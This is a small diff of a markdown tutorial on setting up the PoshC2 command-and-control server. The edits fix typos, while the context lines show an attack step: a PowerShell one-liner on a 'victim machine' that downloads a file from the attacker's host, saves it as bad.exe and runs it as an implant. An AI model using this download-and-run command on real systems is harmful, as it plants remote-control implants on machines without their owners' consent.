@@ -18,7 +18,7 @@ Edit the configuration for your project:
 ```
 posh-config
 ```
-Edit `bindport` to 80, the `payloadcommshost` to http://(parrot IP) Make sure you delete the s in https
+Edit `bindport` to 80, the `payloadcommshost` to http://(parrot IP) *Make sure you delete the s in https*
 
 Launch the Poshc2 server:
 ```
@@ -65,7 +65,7 @@ For testing lets downloading using powershell on victim machine using a basic us
 iwr -uri http://<YouripOrDomian>/en-us/readme.md -outfile C:\windows\temp\bad.exe; C:\windows\temp\bad.exe
 ```
 
-Interact with implant by typeing `1` in ImplantHandler
+Interact with implant by typing `1` in ImplantHandler
 
 # User Escalation
 
